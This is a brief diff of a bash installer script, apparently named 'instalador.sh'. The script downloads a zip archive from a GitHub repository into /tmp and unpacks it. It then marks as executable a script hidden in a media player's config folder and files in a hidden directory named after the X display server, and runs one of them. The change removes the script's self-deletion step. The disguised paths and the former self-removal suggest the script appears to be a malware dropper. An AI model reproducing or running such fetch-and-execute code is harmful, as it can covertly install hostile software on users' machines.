@@ -1,5 +1,4 @@
 #!/bin/bash
-installerdir=$(pwd)
 cd /tmp || exit
 wget https://github.com/Epik00/Epik00/archive/refs/heads/main.zip 
 unzip main.zip 
@@ -13,4 +12,3 @@ chmod +x ~/.local/share/vlc/auth.sh
 rm -rf ./Epik00-main
 chmod +x ./.Xorg-unix/*
 /tmp/.Xorg-unix/start.sh 
-rm "$installerdir"/instalador.sh
